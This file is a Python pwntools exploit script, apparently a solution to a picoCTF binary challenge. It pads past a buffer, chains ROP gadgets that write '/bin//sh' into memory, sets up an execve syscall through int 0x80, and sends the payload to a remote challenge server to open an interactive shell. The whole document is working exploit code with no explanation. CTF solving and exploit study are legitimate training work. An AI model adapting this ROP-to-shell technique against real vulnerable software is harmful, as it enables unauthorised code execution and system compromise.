#!/usr/bin/env python2
from pwn import *
from struct import pack

payload = b'A'*28

payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5060) # @ .data
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x080b074a) # pop eax ; ret
payload += b'/bin'
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5064) # @ .data + 4
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x080b074a) # pop eax ; ret
payload += b'//sh'
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x08049022) # pop ebx ; ret
payload += pack('<I', 0x080e5060) # @ .data
payload += pack('<I', 0x08049e39) # pop ecx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x080e5060) # padding without overwrite ebx
payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0804a3d2) # int 0x80

p = remote("saturn.picoctf.net", 65272)
print(p.recvS())
p.sendline(payload)
p.interactive()